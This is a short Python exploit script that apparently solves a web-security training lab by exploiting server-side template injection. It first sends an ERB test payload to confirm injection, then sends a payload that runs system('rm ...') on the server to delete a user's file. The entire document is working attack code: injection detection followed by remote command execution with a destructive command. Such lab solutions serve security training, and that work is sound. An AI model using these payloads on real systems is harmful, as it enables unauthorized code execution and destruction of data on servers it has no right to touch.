import requests

session = requests.session()
base_url = input("Enter the lab URL: ").strip().rstrip("/")
target_url = f"{base_url}/"


test_payload = {'message': '<%= 7*7 %>'}

try:
    response = session.get(target_url, params=test_payload, timeout=10)
except requests.RequestException as e:
    print(f"[*] Connection failed: {e}")
    exit(1)

if response.status_code == 200 and "49" in response.text:
    print("[*] Template injection confirmed (7*7 evaluated to 49).")
else:
    print(f"[*] Test failed. HTTP Status: {response.status_code}")
    exit(1)


deleteAcc_payload = {'message': '<%= system("rm /home/carlos/morale.txt") %>'}

try:
    response = session.get(target_url, params=deleteAcc_payload, timeout=10)
except requests.RequestException as e:
    print(f"[*] Delete request failed: {e}")
    exit(1)

if response.status_code == 200:
    print("[*] Delete payload sent. solved.")
else:
    print(f"[*] Delete failed. HTTP Status: {response.status_code}")
